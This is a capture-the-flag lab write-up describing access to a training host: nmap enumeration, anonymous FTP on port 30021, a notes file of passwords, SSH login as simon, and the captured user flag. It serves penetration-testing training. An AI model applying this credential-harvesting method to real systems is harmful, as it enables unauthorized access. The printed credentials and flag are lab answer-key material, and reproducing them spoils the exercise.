# Attacking Common Services - Medium

## Engagement Overview

**Target:** Internal server in `inlanefreight.htb`

**Box IP:** `10.129.111.238`

**OS Details:** Linux 4.15–5.19; MikroTik RouterOS 7.2–7.5 (Linux 5.6.3)

**Description:**
The host appears to manage/store emails and files and has been used primarily for testing. It is an internal system and not heavily utilized, which likely contributed to lax controls (e.g., anonymous FTP with sensitive data).

------

## Objectives

- Enumerate exposed services and versions
- Identify a viable initial access vector
- Obtain valid credentials and establish shell access
- Capture the user flag

------

## Service Enumeration

### Nmap

```bash
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
53/tcp    open     domain   ISC BIND 9.16.1 (Ubuntu Linux)
110/tcp   open     pop3     Dovecot pop3d
995/tcp   open     ssl/pop3 Dovecot pop3d
2121/tcp  open     ftp      ProFTPD
30021/tcp open     ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Notes:** Anonymous FTP on port 30021 with a user directory `simon/` is promising. POP3/POP3S suggests local mailboxes might exist for credential leaks, but FTP yielded faster results.

------

## Methodologies

1. **Anonymous FTP → Credential Harvesting**

   - Connected to `ftp://10.129.111.238:30021` anonymously and enumerated `simon/`.
   - Recovered `mynotes.txt` containing multiple candidate secrets.

   ```bash
   ftp> more mynotes.txt
   234987123948729384293
   +23358093845098
   ThatsMyBigDog
   Rock!ng#May
   Puuuuuh7823328
   8Ns8j1b!23hs4921smHzwn
   237oHs71ohls18H127!!9skaP
   238u1xjn1923nZGSb261Bs81
   ```

2. **Credential Testing → SSH Access**

   - Tried candidates against SSH and confirmed working creds:

   ```text
   host: 10.129.111.238
   login: simon
   password: 8Ns8j1b!23hs4921smHzwn
   ```

------

## Initial Access – `simon` via SSH

**Vulnerability Explanation:**
Sensitive credentials stored in world-readable location on an anonymously accessible FTP share allowed lateral authentication to SSH.

**Penetration (commands):**

```bash
ssh simon@10.129.111.238
```

**Result:**

```bash
simon@lin-medium:~$ ls
flag.txt  Maildir
simon@lin-medium:~$ cat flag.txt
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

------

## Privilege Escalation

Not required for objective completion (user flag obtained). Further PE left out-of-scope for this quick hit.

------

## Post-Exploitation

Potential follow‑ups if expanding scope:

- Inspect `Maildir/` for additional creds/tokens
- Enumerate BIND (TCP/53) for zone transfers or misconfigs
- Review ProFTPD configuration for writeable paths / module abuse

------

## Tools Utilized

- `nmap`
- `ftp`
- `ssh`

------

## Key Takeaways

- Anonymous FTP exposing user notes is a classic but still effective failure.
- Credential reuse from testing artifacts enabled straight SSH access.
- Quick wins: check high/odd FTP ports and user home dirs for plaintext secrets.